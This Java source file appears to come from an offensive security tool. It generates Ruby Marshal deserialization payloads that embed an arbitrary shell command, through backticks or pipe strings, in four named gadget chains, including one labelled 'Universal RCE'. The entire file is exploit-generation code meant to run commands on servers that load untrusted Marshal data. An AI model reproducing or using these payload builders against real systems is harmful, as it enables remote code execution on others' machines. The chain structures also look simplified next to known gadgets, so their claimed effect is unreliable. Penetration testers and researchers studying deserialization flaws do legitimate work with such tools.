package com.omnistrike.modules.injection.deser;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Ruby deserialization payload generators.
 *
 * Constructs Marshal.dump byte sequences.
 * Chains: ERB template, Gem::Requirement, Gem::Installer.
 */
public final class RubyPayloads {

    private RubyPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();
        chains.put("ERBTemplate", "ERB template execution via Marshal.load");
        chains.put("GemRequirement", "Gem::Requirement + Gem::DependencyList chain");
        chains.put("GemInstaller", "Gem::Installer + Gem::SpecFetcher chain");
        chains.put("UniversalRCE", "Universal RCE via Gem::Requirement autoload");
        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            case "ERBTemplate"    -> generateErbTemplate(command);
            case "GemRequirement" -> generateGemRequirement(command);
            case "GemInstaller"   -> generateGemInstaller(command);
            case "UniversalRCE"   -> generateUniversalRce(command);
            default -> throw new IllegalArgumentException("Unknown Ruby chain: " + chain);
        };
    }

    private static byte[] generateErbTemplate(String command) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(new byte[]{0x04, 0x08});

            String erbPayload = "<%= `" + command + "` %>";

            bos.write('o');
            writeSymbol(bos, "Gem::Requirement");
            writeInt(bos, 1);
            writeSymbol(bos, "@requirements");

            bos.write('I');
            writeRawString(bos, erbPayload);
            writeInt(bos, 0);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("ERB template generation failed", e);
        }
    }

    private static byte[] generateGemRequirement(String command) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(new byte[]{0x04, 0x08});

            bos.write('o');
            writeSymbol(bos, "Gem::Requirement");
            writeInt(bos, 1);
            writeSymbol(bos, "@requirements");

            bos.write('[');
            writeInt(bos, 1);

            bos.write('o');
            writeSymbol(bos, "Gem::StubSpecification");
            writeInt(bos, 2);
            writeSymbol(bos, "@name");
            writeRawString(bos, "| " + command);
            writeSymbol(bos, "@loaded_from");
            writeRawString(bos, "| " + command);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("GemRequirement generation failed", e);
        }
    }

    private static byte[] generateGemInstaller(String command) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(new byte[]{0x04, 0x08});

            bos.write('o');
            writeSymbol(bos, "Gem::Installer");
            writeInt(bos, 1);
            writeSymbol(bos, "@i");

            bos.write('o');
            writeSymbol(bos, "Gem::SpecFetcher");
            writeInt(bos, 1);
            writeSymbol(bos, "@spec");
            writeRawString(bos, "| " + command);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("GemInstaller generation failed", e);
        }
    }

    private static byte[] generateUniversalRce(String command) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(new byte[]{0x04, 0x08});

            bos.write('o');
            writeSymbol(bos, "Gem::Requirement");
            writeInt(bos, 1);
            writeSymbol(bos, "@requirements");

            bos.write('[');
            writeInt(bos, 2);

            writeRawString(bos, ">=");

            bos.write('o');
            writeSymbol(bos, "Gem::Version");
            writeInt(bos, 1);
            writeSymbol(bos, "@version");
            writeRawString(bos, "`" + command + "`");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("UniversalRCE generation failed", e);
        }
    }

    // ── Marshal encoding helpers ──────────────────────────────────────────────

    private static void writeSymbol(ByteArrayOutputStream bos, String sym) throws IOException {
        bos.write(':');
        byte[] bytes = sym.getBytes(StandardCharsets.UTF_8);
        writeInt(bos, bytes.length);
        bos.write(bytes);
    }

    private static void writeRawString(ByteArrayOutputStream bos, String str) throws IOException {
        bos.write('"');
        byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
        writeInt(bos, bytes.length);
        bos.write(bytes);
    }

    private static void writeInt(ByteArrayOutputStream bos, int n) throws IOException {
        if (n == 0) {
            bos.write(0);
        } else if (n > 0 && n < 123) {
            bos.write(n + 5);
        } else if (n < 0 && n > -124) {
            bos.write((n - 5) & 0xFF);
        } else {
            int count = 0;
            int temp = n;
            byte[] buf = new byte[4];
            for (int i = 0; i < 4; i++) {
                buf[i] = (byte) (temp & 0xFF);
                temp >>= 8;
                count++;
                if (temp == 0 || temp == -1) break;
            }
            bos.write(n > 0 ? count : -count);
            bos.write(buf, 0, count);
        }
    }
}
